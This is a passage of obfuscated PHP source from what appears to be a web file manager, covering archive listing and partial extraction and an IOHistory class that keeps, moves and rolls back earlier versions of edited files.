show_json(LNG($‡ğ™Æ³Ï[108]), !1); } $•¬ß¤ç… = $Îß¸Ç®Ô[$‡ğ™Æ³Ï[1275]][count($Îß¸Ç®Ô[$‡ğ™Æ³Ï[1275]]) - 1]; $ò‹‰å•Ó = in_array(IO::ext($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]]), array($‡ğ™Æ³Ï[389], $‡ğ™Æ³Ï[1281], $‡ğ™Æ³Ï[1282], $‡ğ™Æ³Ï[1283], $‡ğ™Æ³Ï[1284], $‡ğ™Æ³Ï[1285])); if (!$ÍÒŸµ­Û && ($•¬ß¤ç…[$‡ğ™Æ³Ï[1276]] == -1 || $ò‹‰å•Ó)) { $Å—ƒÔÏƒ = $Îß¸Ç®Ô[$‡ğ™Æ³Ï[1277]] . get_path_this($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]]) . $‡ğ™Æ³Ï[1286]; if (!IO::exist($Å—ƒÔÏƒ)) { $ Ñş•²“ = $•¬ß¤ç…[$‡ğ™Æ³Ï[1276]] == -1 ? get_path_ext(IO::pathThis($Ü¼ó†ê­[$‡ğ™Æ³Ï[87]])) : get_path_ext($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]]); $¦Ü–·Ãò = KodArchive::listContent(self::iconvSystem($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]]), !0, $ Ñş•²“); self::unzipErrorCheck($¦Ü–·Ãò, array($‡ğ™Æ³Ï[1287], $Ü¼ó†ê­, $Îß¸Ç®Ô)); @file_put_contents($Å—ƒÔÏƒ, json_encode($¦Ü–·Ãò[$‡ğ™Æ³Ï[1288]])); } return @json_decode(IO::getContent($Å—ƒÔÏƒ), !0); } IO::fileOut($Îß¸Ç®Ô[$‡ğ™Æ³Ï[230]], $ÍÒŸµ­Û, get_path_this($•¬ß¤ç…[$‡ğ™Æ³Ï[32]])); die; } private static function zipFileList($ıˆöè¡‡, $ö‘šÊÅÂ = false) { $…ê¸±åÅ =& $_SERVER[ç¦¬”œš]; $´¹îôŞñ = array(); foreach ($ıˆöè¡‡ as $·ØíŒó‘) { $ê§Ç÷Â´ = $·ØíŒó‘[$…ê¸±åÅ[87]]; if ($ö‘šÊÅÂ) { $ê§Ç÷Â´ = self::copy($·ØíŒó‘[$…ê¸±åÅ[87]], $ö‘šÊÅÂ, $…ê¸±åÅ[898]); } else { $ò¸Šğµ„ = self::init($·ØíŒó‘[$…ê¸±åÅ[87]]); if ($ò¸Šğµ„->getType() == $…ê¸±åÅ[109]) { $ê§Ç÷Â´ = $ò¸Šğµ„->path; } } if ($ê§Ç÷Â´ && self::local()->exist($ê§Ç÷Â´)) { $´¹îôŞñ[$·ØíŒó‘[$…ê¸±åÅ[87]]] = $ê§Ç÷Â´; } } if (!empty($´¹îôŞñ)) { return array_values($´¹îôŞñ); } show_json(LNG($…ê¸±åÅ[1247]), !1); } private static function localFilePath($ëëì”—´) { $¥İ†ñë =& $_SERVER[ç¦¬”œš]; $£Ñë¾ = KodIO::parse($ëëì”—´); if ($£Ñë¾[$¥İ†ñë[33]] == KodIO::KOD_SOURCE) { $¬ƒµÛÍ = Model($¥İ†ñë[904])->fileInfoGet(KodIO::sourceID($ëëì”—´)); if (!$¬ƒµÛÍ[$¥İ†ñë[87]]) { show_json($¥İ†ñë[1289], !1); } $ëëì”—´ = $¬ƒµÛÍ[$¥İ†ñë[87]]; } $¿¸§‘ú = self::init($ëëì”—´); if ($¿¸§‘ú->pathParse[$¥İ†ñë[1233]]) { $ëëì”—´ = $¿¸§‘ú->pathParse[$¥İ†ñë[1233]]; $¿¸§‘ú = self::init($ëëì”—´); } $ùúáÈ´ª = $¿¸§‘ú->getType(); if ($ùúáÈ´ª == $¥İ†ñë[109] || $ùúáÈ´ª == $¥İ†ñë[1290]) { if (!$¿¸§‘ú->exist($¿¸§‘ú->path)) { show_json(LNG($¥İ†ñë[108]), !1); } return $¿¸§‘ú->path; } return !1; } public static function unzipPart($ÉÛ­úÚ, $É–†¾¿© = -1) { $½û¥²ê =& $_SERVER[ç¦¬”œš]; $Á‚’ì²Ñ = IO::pathThis($ÉÛ­úÚ); if (!$É–†¾¿© || $É–†¾¿© == -1) { $Øšëèµ¼ = array(array($½û¥²ê[32] => $Á‚’ì²Ñ, $½û¥²ê[1276] => -1)); $Øšëèµ¼[0][$½û¥²ê[1291]] = $Øšëèµ¼[0][$½û¥²ê[32]]; } else { if (is_array($É–†¾¿©)) { $Øšëèµ¼ = $É–†¾¿©; $êıóÜÜê = count($Øšëèµ¼) - 1; for ($ì˜Ï–Ä‚ = 0; $ì˜Ï–Ä‚ <= $êıóÜÜê; $ì˜Ï–Ä‚++) { $çÅ«±£ = $Øšëèµ¼[$ì˜Ï–Ä‚]; $¾ñÖÎáş = get_path_this($çÅ«±£[$½û¥²ê[32]]) . (checkExtSafe($çÅ«±£[$½û¥²ê[32]]) ? $½û¥²ê[12] : $½û¥²ê[1292]); $Øšëèµ¼[$ì˜Ï–Ä‚][$½û¥²ê[1291]] = $½û¥²ê[1293] . intval($çÅ«±£[$½û¥²ê[1276]]) . $½û¥²ê[462] . $¾ñÖÎáş; if ($ì˜Ï–Ä‚ == 0) { continue; } $Øšëèµ¼[$ì˜Ï–Ä‚][$½û¥²ê[1291]] = $Øšëèµ¼[$ì˜Ï–Ä‚ - 1][$½û¥²ê[1291]] . $½û¥²ê[1294] . $Øšëèµ¼[$ì˜Ï–Ä‚][$½û¥²ê[1291]]; } } } if (!is_array($Øšëèµ¼) || count($Øšëèµ¼) == 0) { return !1; } $Á¸Õ’Í = $Øšëèµ¼[count($Øšëèµ¼) - 1]; if (!IO::exist($ÉÛ­úÚ)) { return !1; } $Â‚¹ÓúÎ = TEMP_FILES . $½û¥²ê[1295] . kodIO::hashPathSafe($ÉÛ­úÚ) . $½û¥²ê[8]; $À÷¸Ô³Â = $Â‚¹ÓúÎ . $Á¸Õ’Í[$½û¥²ê[1291]]; mk_dir($Â‚¹ÓúÎ); file_put_contents(TEMP_FILES . $½û¥²ê[1267], $½û¥²ê[12]); if (IO::exist($À÷¸Ô³Â)) { return array($½û¥²ê[230] => $À÷¸Ô³Â, $½û¥²ê[1275] => $Øšëèµ¼, $½û¥²ê[1277] => $Â‚¹ÓúÎ); } $¸·÷å = self::localFilePath($ÉÛ­úÚ); if (!$¸·÷å) { $¸·÷å = $Â‚¹ÓúÎ . $½û¥²ê[1296]; if (!IO::exist($¸·÷å)) { self::copy($ÉÛ­úÚ, $Â‚¹ÓúÎ, !1, get_path_this($¸·÷å)); } } if (!$¸·÷å || !IO::exist($¸·÷å)) { return !1; } if ($Á¸Õ’Í[$½û¥²ê[1276]] == -1) { return array($½û¥²ê[230] => $¸·÷å, $½û¥²ê[1275] => $Øšëèµ¼, $½û¥²ê[1277] => $Â‚¹ÓúÎ); } $Ğıîî¹Å = $¸·÷å; foreach ($Øšëèµ¼ as $ì˜Ï–Ä‚ => $çÅ«±£) { if (!$çÅ«±£ || $çÅ«±£[$½û¥²ê[1276]] == $½û¥²ê[1274]) { break; } if (substr($çÅ«±£[$½û¥²ê[32]], -1, 1) == $½û¥²ê[8]) { break; } $¡àò¯Ü = in_array(get_path_ext($çÅ«±£[$½û¥²ê[1291]]), array($½û¥²ê[389], $½û¥²ê[1281], $½û¥²ê[1282], $½û¥²ê[1283], $½û¥²ê[1284], $½û¥²ê[1285])); $Ó™ñÅæ = $ì˜Ï–Ä‚ == count($Øšëèµ¼) - 1 && $¡àò¯Ü; $üÔìÀˆà = $Â‚¹ÓúÎ . $çÅ«±£[$½û¥²ê[1291]]; $Îçéà©† = $Â‚¹ÓúÎ . get_path_this($çÅ«±£[$½û¥²ê[32]]); if (IO::exist($üÔìÀˆà)) { $Ğıîî¹Å = $üÔìÀˆà; continue; } $—«ÅÌ†± = $ì˜Ï–Ä‚ == 0 ? get_path_ext($Á‚’ì²Ñ) : get_path_ext($Ğıîî¹Å); $ÎÍÊçè = KodArchive::extract(self::iconvSystem($Ğıîî¹Å), $Â‚¹ÓúÎ, $çÅ«±£[$½û¥²ê[1276]], $Ùæ¹Ğ¹Å, $—«ÅÌ†±); self::unzipErrorCheck($ÎÍÊçè, array($½û¥²ê[1297], $ÉÛ­úÚ, $Øšëèµ¼, $çÅ«±£, $üÔìÀˆà)); if (IO::exist($Îçéà©†)) { IO::rename($Îçéà©†, get_path_this($üÔìÀˆà)); } $Ğıîî¹Å = $üÔìÀˆà; } $À÷¸Ô³Â = $Ğıîî¹Å; return array($½û¥²ê[230] => $Ğıîî¹Å, $½û¥²ê[1275] => $Øšëèµ¼, $½û¥²ê[1277] => $Â‚¹ÓúÎ); } private static function unzipErrorCheck($šÑ®Œ„², $öæ¢‰Ğì = false) { $µÊæı¾ò =& $_SERVER[ç¦¬”œš]; if ($šÑ®Œ„²[$µÊæı¾ò[1298]]) { return !0; } write_log(array($µÊæı¾ò[1299], $šÑ®Œ„², $öæ¢‰Ğì), $µÊæı¾ò[1300]); show_json($µÊæı¾ò[1301] . json_encode($šÑ®Œ„²[$µÊæı¾ò[1288]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $õÆŸ¹×ã =& $_SERVER[ç¦¬”œš]; $ò¶ô°ò€ = $GLOBALS[$õÆŸ¹×ã[6]][$õÆŸ¹×ã[92]]; if ($ò¶ô°ò€[$õÆŸ¹×ã[1302]] != 1) { return; } if ($ò¶ô°ò€[$õÆŸ¹×ã[1303]] <= 0) { return; } if (isset($_REQUEST[$õÆŸ¹×ã[1304]]) && $_REQUEST[$õÆŸ¹×ã[1304]] == $õÆŸ¹×ã[91]) { return; } Hook::bind($õÆŸ¹×ã[1305], $õÆŸ¹×ã[1306]); Hook::bind($õÆŸ¹×ã[1307], $õÆŸ¹×ã[1308]); Hook::bind($õÆŸ¹×ã[1309], $õÆŸ¹×ã[1310]); Hook::bind($õÆŸ¹×ã[1311], $õÆŸ¹×ã[1312]); Hook::bind($õÆŸ¹×ã[1313], $õÆŸ¹×ã[1314]); Hook::bind($õÆŸ¹×ã[1315], $õÆŸ¹×ã[1316]); } public static function eventBeforeUpload($¢ûŠ‘¬) { if ($¢ûŠ‘¬[3] && $¢ûŠ‘¬[3] != REPEAT_REPLACE) { return; } $¤·÷î—Ö = self::parsePath($¢ûŠ‘¬[0]); if (!$¤·÷î—Ö) { return; } self::add($¤·÷î—Ö); } public static function eventBeforeEdit($ÁÛÒöéø) { $İ¡Ü†Í• = self::parsePath($ÁÛÒöéø[0]); if (!$İ¡Ü†Í•) { return; } self::add($İ¡Ü†Í•); } public static function eventBeforeCopyFile($ ËÀš¯Æ, $çÂ•”®ù, $ı–áÙ€ô, $¹³«É´¦, $ÜÊşÒ, $»Ôø·Ã¬) { $êŞñîòå =& $_SERVER[ç¦¬”œš]; if (isset($ı–áÙ€ô->_data[$êŞñîòå[1237]]) && $ı–áÙ€ô->_data[$êŞñîòå[1237]]) { return; } $Ê¡›œ‰ì = $ı–áÙ€ô->getPathOuter($¹³«É´¦); $×ä÷§ø = self::parsePath($Ê¡›œ‰ì); if (!$×ä÷§ø) { return; } self::add($×ä÷§ø); } public static function eventBeforeRename($úë¹·¢») { $èïÉ¶¸Ã =& $_SERVER[ç¦¬”œš]; $ŒÈµ“µô = self::parsePath($úë¹·¢»[0]); if (!$ŒÈµ“µô) { return; } $Î“‹ØÛ‘ = self::checkInHistory($ŒÈµ“µô); if (!$Î“‹ØÛ‘) { return; } if ($Î“‹ØÛ‘[$èïÉ¶¸Ã[33]] == $èïÉ¶¸Ã[230]) { $¤¶˜æè´ = self::listData($ŒÈµ“µô); if ($¤¶˜æè´ && $¤¶˜æè´[$èïÉ¶¸Ã[445]]) { self::moveHistory($ŒÈµ“µô, $úë¹·¢»[1]); } } else { IO::rename($Î“‹ØÛ‘[$èïÉ¶¸Ã[87]], $úë¹·¢»[1]); } } public static function eventBeforeMove($®Î¦¬Òš) { $Ü­’†—® =& $_SERVER[ç¦¬”œš]; $¯âô³æú = self::parsePath($®Î¦¬Òš[0]); if (!$¯âô³æú) { return; } $ÌŒ­Şä¾ = self::parsePath($®Î¦¬Òš[1]); if (!$ÌŒ­Şä¾) { return; } $´¤ËŒø« = $®Î¦¬Òš[3]; $‰ˆ–­³‚ = self::checkInHistory($¯âô³æú); if (!$‰ˆ–­³‚) { return; } $ŞÁö•Üç = self::pathHistory($ÌŒ­Şä¾); if ($‰ˆ–­³‚[$Ü­’†—®[33]] == $Ü­’†—®[230]) { $‹£üÓ£Ü = self::listData($¯âô³æú); $É×›â = rtrim($ÌŒ­Şä¾, $Ü­’†—®[8]) . $Ü­’†—®[8] . ($´¤ËŒø« ? $´¤ËŒø« : get_path_this($¯âô³æú)); $¥¹¹¢çŠ = self::listData($É×›â); if ($‹£üÓ£Ü && $‹£üÓ£Ü[$Ü­’†—®[445]] && $¥¹¹¢çŠ && $¥¹¹¢çŠ[$Ü­’†—®[445]]) { return self::clear($¯âô³æú); } if ($‹£üÓ£Ü && $‹£üÓ£Ü[$Ü­’†—®[445]]) { self::moveHistory($¯âô³æú, $´¤ËŒø«, $ŞÁö•Üç); } } else { IO::move($‰ˆ–­³‚[$Ü­’†—®[87]], $ŞÁö•Üç, !1, $´¤ËŒø«); self::clearEmptyFolder(IO::pathFather($‰ˆ–­³‚[$Ü­’†—®[87]])); } } public static function eventAfterRemove($ˆŠã˜‰º, $ìßÜåƒ…) { $Ö¸ıæìª =& $_SERVER[ç¦¬”œš]; if (!$ìßÜåƒ…) { return; } $Á “áÀé = self::parsePath($ˆŠã˜‰º[0]); if (!$Á “áÀé) { return; } $ıÃ™¡ÄÍ = self::checkInHistory($Á “áÀé); if (!$ıÃ™¡ÄÍ) { return; } if ($ıÃ™¡ÄÍ[$Ö¸ıæìª[33]] == $Ö¸ıæìª[230]) { $»‘úæë¤ = self::listData($Á “áÀé, !1); if ($»‘úæë¤ && $»‘úæë¤[$Ö¸ıæìª[445]]) { self::clear($Á “áÀé, !1); } } else { IO::remove($ıÃ™¡ÄÍ[$Ö¸ıæìª[87]]); self::clearEmptyFolder(IO::pathFather($ıÃ™¡ÄÍ[$Ö¸ıæìª[87]])); } } private static function checkInHistory($„¥ñÈ”) { $ÓØºº¤• = self::pathHistory($„¥ñÈ”); if (!IO::exist($ÓØºº¤•)) { $ÓØºº¤• .= $_SERVER[ç¦¬”œš][1317]; } return IO::exist($ÓØºº¤•) ? IO::info($ÓØºº¤•) : !1; } private static function parsePath($¸«¸šä) { $“‘¼Îñ¬ =& $_SERVER[ç¦¬”œš]; if (!$¸«¸šä) { return !1; } if (isset($GLOBALS[$“‘¼Îñ¬[1318]]) && $GLOBALS[$“‘¼Îñ¬[1318]]) { return; } $ÜÇÛÂ“Ÿ = KodIO::parse($¸«¸šä); $€ñÏ÷Æå = $ÜÇÛÂ“Ÿ[$“‘¼Îñ¬[33]]; $‚ÏµÁÂÂ = !$€ñÏ÷Æå || $€ñÏ÷Æå == KodIO::KOD_IO || $€ñÏ÷Æå == KodIO::KOD_SHARE_ITEM; if (!$‚ÏµÁÂÂ || !$ÜÇÛÂ“Ÿ[$“‘¼Îñ¬[1319]]) { return !1; } if (substr($¸«¸šä, 0, strlen(DATA_PATH . $“‘¼Îñ¬[1320])) == DATA_PATH . $“‘¼Îñ¬[1320]) { return !1; } if ($€ñÏ÷Æå == KodIO::KOD_SHARE_ITEM) { $‰…µÀ°½ = IO::init($¸«¸šä); if ($‰…µÀ°½->pathParse[$“‘¼Îñ¬[1233]]) { return self::parsePath($‰…µÀ°½->pathParse[$“‘¼Îñ¬[1233]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¶ß¹æÃè = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $“‘¼Îñ¬[1321]); foreach ($¶ß¹æÃè as $ğÚ­§ƒİ) { if (!$€ñÏ÷Æå && substr($¸«¸šä, 0, strlen($ğÚ­§ƒİ)) == $ğÚ­§ƒİ) { return !1; } } self::log($GLOBALS[$“‘¼Îñ¬[1228]] . $“‘¼Îñ¬[1322] . $¸«¸šä); return $¸«¸šä; } private static function pathHistory($Á×¦éÕ) { $ÃåøÛ¸  =& $_SERVER[ç¦¬”œš]; $»¨¹”°á = self::$_historyBase . ltrim(KodIO::clear($Á×¦éÕ), $ÃåøÛ¸ [8]); $»¨¹”°á = str_replace(array($ÃåøÛ¸ [1323]), array($ÃåøÛ¸ [1324]), $»¨¹”°á); return $»¨¹”°á; } public static function log($Ÿ¦İà·¶) { } public static function historyCount($ß®üş£«) { $µŸÆñ‘ =& $_SERVER[ç¦¬”œš]; $²ĞõÇ÷¹ = array(); $¬õ¨İíÔ = array(); foreach ($ß®üş£« as $ÕŸˆ§¡ş) { $ğÛ¹†Ÿ = get_path_father($ÕŸˆ§¡ş); if (!$¬õ¨İíÔ[$ğÛ¹†Ÿ]) { $¬õ¨İíÔ[$ğÛ¹†Ÿ] = array(); } $¬õ¨İíÔ[$ğÛ¹†Ÿ][] = get_path_this($ÕŸˆ§¡ş); } foreach ($¬õ¨İíÔ as $ğÛ¹†Ÿ => $óª„à) { $¼ÂßŒ¡ = self::parsePath($ğÛ¹†Ÿ); if (!$¼ÂßŒ¡) { continue; } foreach ($óª„à as $òÙ€¬°“) { $¶¸œÂ°« = self::listData(rtrim($¼ÂßŒ¡, $µŸÆñ‘[8]) . $µŸÆñ‘[8] . $òÙ€¬°“, !1); if ($¶¸œÂ°« && $¶¸œÂ°«[$µŸÆñ‘[445]]) { $²ĞõÇ÷¹[rtrim($ğÛ¹†Ÿ, $µŸÆñ‘[8]) . $µŸÆñ‘[8] . $òÙ€¬°“] = count($¶¸œÂ°«[$µŸÆñ‘[445]]); } } } return $²ĞõÇ÷¹; } public static function add($ÕÚ©¿¢é) { $¸ÃÒ§¨ =& $_SERVER[ç¦¬”œš]; $™ì¥‰óø = self::listData($ÕÚ©¿¢é); if (!$™ì¥‰óø) { return; } $·•ÆºÔï = Model($¸ÃÒ§¨[850])->get($¸ÃÒ§¨[1325]); $¹ùğñ£« = intval($GLOBALS[$¸ÃÒ§¨[6]][$¸ÃÒ§¨[92]][$¸ÃÒ§¨[1303]]); $üÙè•È = $·•ÆºÔï == $¸ÃÒ§¨[1326] ? min(5, $¹ùğñ£«) : $¹ùğñ£«; if ($¹ùğñ£« <= 0) { return; } $È¸¹¨Ë´ = IO::info($ÕÚ©¿¢é); $Æ¾Ü¾¥ = $™ì¥‰óø[$¸ÃÒ§¨[445]]; if ($È¸¹¨Ë´[$¸ÃÒ§¨[79]] == 0) { return; } if ($È¸¹¨Ë´[$¸ÃÒ§¨[79]] >= 1024 * 1024 * 500) { return !1; } $ÔÛõå¸ù = IO::hashSimple($ÕÚ©¿¢é); if ($Æ¾Ü¾¥ && $Æ¾Ü¾¥[0][$¸ÃÒ§¨[681]] == $ÔÛõå¸ù) { return !0; } if (array_key_exists($¸ÃÒ§¨[233], $È¸¹¨Ë´) && !$È¸¹¨Ë´[$¸ÃÒ§¨[233]]) { return !1; } $–Šî“ı­ = short_id(time()); $üßÓæœí = array($¸ÃÒ§¨[484] => $–Šî“ı­, $¸ÃÒ§¨[681] => $ÔÛõå¸ù, $¸ÃÒ§¨[32] => $È¸¹¨Ë´[$¸ÃÒ§¨[32]] . $¸ÃÒ§¨[10] . date($¸ÃÒ§¨[1327]) . rand_string(1), $¸ÃÒ§¨[79] => $È¸¹¨Ë´[$¸ÃÒ§¨[79]], $¸ÃÒ§¨[536] => USER_ID, $¸ÃÒ§¨[231] => time(), $¸ÃÒ§¨[1328] => $¸ÃÒ§¨[12]); IO::mkdir($™ì¥‰óø[$¸ÃÒ§¨[1329]]); $£¦Û¿¨ = IO::copy($ÕÚ©¿¢é, $™ì¥‰óø[$¸ÃÒ§¨[1329]], !1, $üßÓæœí[$¸ÃÒ§¨[32]]); if (!$£¦Û¿¨) { self::clearEmptyFolder($™ì¥‰óø[$¸ÃÒ§¨[1329]]); return !1; } array_unshift($Æ¾Ü¾¥, $üßÓæœí); if (count($Æ¾Ü¾¥) > $üÙè•È) { $Í¦¦éãà = array_slice($Æ¾Ü¾¥, $üÙè•È); foreach ($Í¦¦éãà as $œáêìÚß) { IO::remove($™ì¥‰óø[$¸ÃÒ§¨[1329]] . $œáêìÚß[$¸ÃÒ§¨[32]]); } $Æ¾Ü¾¥ = array_slice($Æ¾Ü¾¥, 0, $üÙè•È); } return self::saveData($™ì¥‰óø[$¸ÃÒ§¨[1330]], $Æ¾Ü¾¥); } public static function remove($ƒÜ¹É’ø, $˜£í£Æñ) { $Ü­‹¿„÷ =& $_SERVER[ç¦¬”œš]; $…Š§ú‚ş = self::listData($ƒÜ¹É’ø); $¶º´®±¤ = array(); if (!$…Š§ú‚ş) { return !1; } foreach ($…Š§ú‚ş[$Ü­‹¿„÷[445]] as $ŠÏš¶) { if ($ŠÏš¶[$Ü­‹¿„÷[484]] == $˜£í£Æñ) { IO::remove($…Š§ú‚ş[$Ü­‹¿„÷[1329]] . $ŠÏš¶[$Ü­‹¿„÷[32]]); continue; } $¶º´®±¤[] = $ŠÏš¶; } return self::saveData($…Š§ú‚ş[$Ü­‹¿„÷[1330]], $¶º´®±¤); } public static function clear($ûÏú¯ç™, $üŒíîì = true) { $‘í³Ä¡Ã =& $_SERVER[ç¦¬”œš]; $£Œ°ø¡ = self::listData($ûÏú¯ç™, $üŒíîì); if (!$£Œ°ø¡) { return !1; } foreach ($£Œ°ø¡[$‘í³Ä¡Ã[445]] as $†Ôê™¥Ø) { IO::remove($£Œ°ø¡[$‘í³Ä¡Ã[1329]] . $†Ôê™¥Ø[$‘í³Ä¡Ã[32]]); } return self::saveData($£Œ°ø¡[$‘í³Ä¡Ã[1330]], array()); } public static function moveHistory($§«‹é®æ, $Öú”­£ = '', $¶Åõà¨† = '') { $¨ºñã…’ =& $_SERVER[ç¦¬”œš]; $†ñş¶Çõ = self::listData($§«‹é®æ, !1); if (!$†ñş¶Çõ || !$†ñş¶Çõ[$¨ºñã…’[445]]) { return !1; } $ß—ÂÖÉ = $¨ºñã…’[1317]; $Öú”­£ = $Öú”­£ ? $Öú”­£ : get_path_this($§«‹é®æ); $¶Åõà¨† = $¶Åõà¨† ? $¶Åõà¨† : $†ñş¶Çõ[$¨ºñã…’[1329]]; $Éö›§¡ê = substr(get_path_this($†ñş¶Çõ[$¨ºñã…’[1330]]), 0, -strlen($ß—ÂÖÉ)); foreach ($†ñş¶Çõ[$¨ºñã…’[445]] as $ˆÏœ¡«» => $µù¼¦¶—) { $¨‰ó˜·ƒ = $Öú”­£ . substr($µù¼¦¶—[$¨ºñã…’[32]], strlen($Éö›§¡ê)); $óÕŠªáğ = IO::move($†ñş¶Çõ[$¨ºñã…’[1329]] . $µù¼¦¶—[$¨ºñã…’[32]], $¶Åõà¨†, !1, $¨‰ó˜·ƒ); if ($óÕŠªáğ) { $†ñş¶Çõ[$¨ºñã…’[445]][$ˆÏœ¡«»][$¨ºñã…’[32]] = $¨‰ó˜·ƒ; } } $†ñş¶Çõ[$¨ºñã…’[1330]] = IO::move($†ñş¶Çõ[$¨ºñã…’[1330]], $¶Åõà¨†, !1, $Öú”­£ . $ß—ÂÖÉ); self::saveData($†ñş¶Çõ[$¨ºñã…’[1330]], $†ñş¶Çõ[$¨ºñã…’[445]]); self::clearEmptyFolder($†ñş¶Çõ[$¨ºñã…’[1329]]); } public static function rollback($ßàÔŸµµ, $°‡ÂÌÎ˜) { $£¾åôè =& $_SERVER[ç¦¬”œš]; $³›¥Ü¹Ş = self::listData($ßàÔŸµµ); if (!$³›¥Ü¹Ş) { return; } $ıØ„‚é´ = IO::info($ßàÔŸµµ); foreach ($³›¥Ü¹Ş[$£¾åôè[445]] as $æ¢á•’¸ => $Ø‹Ğê½š) { if ($Ø‹Ğê½š[$£¾åôè[484]] == $°‡ÂÌÎ˜) { self::add($ßàÔŸµµ); $ìöëêß = $³›¥Ü¹Ş[$£¾åôè[1329]] . $Ø‹Ğê½š[$£¾åôè[32]]; $°–íİº™ = IO::copy($ìöëêß, IO::pathFather($ßàÔŸµµ), REPEAT_REPLACE, $ıØ„‚é´[$£¾åôè[32]]); if ($°–íİº™) { self::remove($ßàÔŸµµ, $°‡ÂÌÎ˜); } return $°–íİº™; } } return !1; } public static function setDetail($¡¨“‡íÑ, $¢ÂËÒÇ“, $È€¨ç¢) { $»­ü øŒ =& $_SERVER[ç¦¬”œš]; $±¶°©—Ñ = self::listData($¡¨“‡íÑ); if (!$±¶°©—Ñ) { return; } foreach ($±¶°©—Ñ[$»­ü øŒ[445]] as $ËÎ×Åšæ => $ïà¡İ¨ô) { if ($ïà¡İ¨ô[$»­ü øŒ[484]] == $¢ÂËÒÇ“) { $±¶°©—Ñ[$»­ü øŒ[445]][$ËÎ×Åšæ][$»­ü øŒ[1328]] = $È€¨ç¢; self::saveData($±¶°©—Ñ[$»­ü øŒ[1330]], $±¶°©—Ñ[$»­ü øŒ[445]]); return !0; } } return !1; } public static function fileInfo($†ˆ˜ñ‰, $»—âßîÎ) { $™èåŠµ¦ =& $_SERVER[ç¦¬”œš]; $œØïÈã = self::listData($†ˆ˜ñ‰); if (!$œØïÈã) { show_json(LNG($™èåŠµ¦[108]), !1); } $œ§œ¨û¸ = $™èåŠµ¦[12]; foreach ($œØïÈã[$™èåŠµ¦[445]] as $êÑ­ÏŞö => $ª³ß‚ñß) { if ($ª³ß‚ñß[$™èåŠµ¦[484]] != $»—âßîÎ) { continue; } $œ§œ¨û¸ = $œØïÈã[$™èåŠµ¦[1329]] . $ª³ß‚ñß[$™èåŠµ¦[32]]; break; } if (!$œ§œ¨û¸) { show_json(LNG($™èåŠµ¦[108]), !1); } return IO::info($œ§œ¨û¸); } public static function fileOut($°‹µŠçª, $™‡·«¿Ü, $ê‘ˆçéë = false) { $¥íÂçØø =& $_SERVER[ç¦¬”œš]; $Íãò«ö = self::fileInfo($°‹µŠçª, $™‡·«¿Ü); $Şú•›ˆ™ =& $GLOBALS[$¥íÂçØø[7]]; $ê‘ˆçéë = isset($Şú•›ˆ™[$¥íÂçØø[1280]]) && $Şú•›ˆ™[$¥íÂçØø[1280]] == 1; if (isset($Şú•›ˆ™[$¥íÂçØø[33]]) && $Şú•›ˆ™[$¥íÂçØø[33]] == $¥íÂçØø[1331]) { return IO::fileOutImage($Íãò«ö[$¥íÂçØø[87]], $Şú•›ˆ™[$¥íÂçØø[1332]]); } IO::fileOut($Íãò«ö[$¥íÂçØø[87]], $ê‘ˆçéë, get_path_this($°‹µŠçª)); } public static function listData($ßÊ»‹ˆ, $•¹Û¨ÉÅ = true) { $›²¥›‘ =& $_SERVER[ç¦¬”œš]; if ($•¹Û¨ÉÅ && !IO::exist($ßÊ»‹ˆ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ßÊ»‹ˆ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¼ÍÒÌüÃ = self::pathHistory($ßÊ»‹ˆ); $œ¸¯ÄÜ = array($›²¥›‘[1330] => $¼ÍÒÌüÃ . $›²¥›‘[1317], $›²¥›‘[1329] => rtrim(get_path_father($¼ÍÒÌüÃ), $›²¥›‘[8]) . $›²¥›‘[8], $›²¥›‘[445] => array()); $Ô„æ ñ = IO::getContent($œ¸¯ÄÜ[$›²¥›‘[1330]]); if ($Ô„æ ñ) { $µ¨‚Ô¦ = json_decode($Ô„æ ñ, !0); if (is_array($µ¨‚Ô¦)) { $œ¸¯ÄÜ[$›²¥›‘[445]] = $µ¨‚Ô¦; } } return $œ¸¯ÄÜ; } private static function saveData($ò»Â‡¬, $ÀŒûÂÇÀ) { $­ŒîÛËÛ =& $_SERVER[ç¦¬”œš]; self::log($­ŒîÛËÛ[1333] . $ò»Â‡¬ . $­ŒîÛËÛ[74] . count($ÀŒûÂÇÀ), $­ŒîÛËÛ[832]); if ($ÀŒûÂÇÀ) { return IO::setContent($ò»Â‡¬, json_encode($ÀŒûÂÇÀ)); } $¯˜‹ù‡Œ = IO::pathFather($ò»Â‡¬); IO::remove($ò»Â‡¬); self::clearEmptyFolder($¯˜‹ù‡Œ); return !0; } public static function clearEmptyFolder($™Ëø°Ô‹) { $ıÊ¤¤´ì =& $_SERVER[ç¦¬”œš]; if (trim($™Ëø°Ô‹, $ıÊ¤¤´ì[8]) == trim(self::$_historyBase, $ıÊ¤¤´ì[8])) { return; } $ùºÕåóø = IO::pathFather($™Ëø°Ô‹); $ÏÊ¹Êß© = IO::has($™Ëø°Ô‹, !0); if ($ÏÊ¹Êß©[$ıÊ¤¤´ì[239]] > 0 || $ÏÊ¹Êß©[$ıÊ¤¤´ì[240]] > 0) { return; } IO::remove($™Ëø°Ô‹); self::clearEmptyFolder($ùºÕåóø); } private static function getBasePath() { $ÜÂ¢ÇÂ =& $_SERVER[ç¦¬”œš]; $¢úİ»ßÂ = Model($ÜÂ¢ÇÂ[1334])->get($ÜÂ¢ÇÂ[1335]); if ($¢úİ»ßÂ) { if (!IO::exist($¢úİ»ßÂ)) { IO::mkdir($¢úİ»ßÂ); } if (get_path_this($¢úİ»ßÂ) == $ÜÂ¢ÇÂ[1320]) { $ë¡á‡¾é = $ÜÂ¢ÇÂ[1336] . rand_string(8); @rename($¢úİ»ßÂ, get_path_father($¢úİ»ßÂ) . $ÜÂ¢ÇÂ[8] . $ë¡á‡¾é); $¢úİ»ßÂ = DATA_PATH . $ë¡á‡¾é . $ÜÂ¢ÇÂ[8]; file_put_contents(DATA_PATH . $ÜÂ¢ÇÂ[1267], $ÜÂ¢ÇÂ[12]); Model($ÜÂ¢ÇÂ[1334])->set($ÜÂ¢ÇÂ[1335], $¢úİ»ßÂ); } return $¢úİ»ßÂ; } $¢úİ»ßÂ = 